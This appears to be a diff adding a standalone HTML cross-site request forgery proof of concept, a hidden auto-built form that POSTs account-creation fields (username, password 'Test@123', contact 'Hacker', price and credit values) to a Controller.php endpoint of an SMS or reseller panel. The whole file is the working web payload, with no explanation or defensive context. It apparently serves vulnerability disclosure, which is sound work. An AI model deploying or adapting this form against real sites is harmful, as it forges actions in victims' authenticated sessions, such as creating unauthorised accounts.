@@ -1,0 +1,37 @@
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://github.com/sh377c0d3/Controller.php" method="POST">
+      <input type="hidden" name="hdnToken" value="" />
+      <input type="hidden" name="hdnMode" value="1" />
+      <input type="hidden" name="hdnSubmit" value="1" />
+      <input type="hidden" name="hdnUserId" value="" />
+      <input type="hidden" name="hdnUserStatus" value="0" />
+      <input type="hidden" name="hdnResCode" value="grad" />
+      <input type="hidden" name="hdnDistId" value="&#45;1" />
+      <input type="hidden" name="restoken" value="e2612910d7614b87291a4fba01fd182a74108cad97896bcb839402f15776361e" />
+      <input type="hidden" name="txtUserCompany" value="test" />
+      <input type="hidden" name="txtUserName" value="user23" />
+      <input type="hidden" name="pwdUserPassword" value="Test@123" />
+      <input type="hidden" name="hdnPassChange" value="Test@123" />
+      <input type="hidden" name="txtEmailId" value="test&#64;test&#46;com" />
+      <input type="hidden" name="txtMobileNo" value="9888888888" />
+      <input type="hidden" name="cmbRouteType" value="promo1" />
+      <input type="hidden" name="txtPrice" value="100" />
+      <input type="hidden" name="hdnPriceChange" value="0" />
+      <input type="hidden" name="txtCreditAdd" value="0" />
+      <input type="hidden" name="txtBalance" value="0" />
+      <input type="hidden" name="txtCreditLimit" value="0" />
+      <input type="hidden" name="txtCreditAlloted" value="0" />
+      <input type="hidden" name="txtContactPer" value="Hacker" />
+      <input type="hidden" name="txtStoreHrs" value="00" />
+      <input type="hidden" name="txtStoreMins" value="00" />
+      <input type="hidden" name="txtForwardHrs" value="00" />
+      <input type="hidden" name="txtForwardMins" value="00" />
+      <input type="hidden" name="selCurrencyType" value="INR" />
+      <input type="hidden" name="txtDlr" value="" />
+      <input type="hidden" name="sCreditEmialId" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
